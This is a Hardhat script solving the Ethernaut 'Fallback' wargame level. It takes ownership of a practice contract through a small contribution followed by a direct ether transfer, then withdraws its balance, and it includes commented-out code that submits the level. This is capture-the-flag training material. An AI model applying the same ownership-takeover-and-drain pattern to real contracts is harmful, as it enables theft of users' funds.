import { ethers } from "hardhat";
import { ETHERNAUT_ABI, ETHERNAUT_ADDRESS } from "./constants";

const INSTANCE_ADDRESS = "0x4E93044a76b289C7115301aAA738f761A16552F4";

async function main() {
  const [me] = await ethers.getSigners();
  // Hardhat always runs the compile task when running scripts with its command
  // line interface.
  //
  // If this script is run directly using `node` you may want to call compile
  // manually to make sure everything is compiled
  // await hre.run('compile');

  // We get the contract to deploy
  const ethernaut = await ethers.getContractAt(
    ETHERNAUT_ABI,
    ETHERNAUT_ADDRESS
  );

  const Contract = await ethers.getContractFactory("Fallback");
  const contract = await Contract.attach(INSTANCE_ADDRESS);

  await contract.deployed();

  console.log(await contract.owner());

  console.log("Contribute 500 wei");
  await contract.contribute({ value: ethers.utils.parseUnits("500", "wei") });
  console.log("Send 0.0001 ether to gain control of contract");
  await me.sendTransaction({
    to: contract.address,
    value: ethers.utils.parseEther("0.0001"),
  });

  console.log(await contract.owner());

  console.log(
    `Balance in contract to start: ${await ethers.provider.getBalance(
      contract.address
    )}`
  );
  await contract.withdraw();
  console.log(
    `Balance in contract to end: ${await ethers.provider.getBalance(
      contract.address
    )}`
  );

  // with contract - does not pass level though as the new owner address is different
  // const Solution = await ethers.getContractFactory("Level1Solution");
  // const solution = await Solution.deploy(contract.address, {
  //   value: ethers.utils.parseEther("0.001"),
  // });
  // await solution.deployed();
  // // take control of the contract and withdraw the funds, (original contribution)
  // await solution.gainControlAndWithdraw();
  // await solution.withdraw();

  /**
   * Uncomment the below to automatically submit the level instance, you will have to refresh the ethernaut page and will not see the pretty level completed message.
   * I suggest submittin the instance on the ethernaut website.
   * I only did this for my own personal satisfaction
   */
  // submit level instance
  // const tx = await ethernaut.submitLevelInstance(INSTANCE_ADDRESS);
  // const rc = await tx.wait();
  // console.log(rc);
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
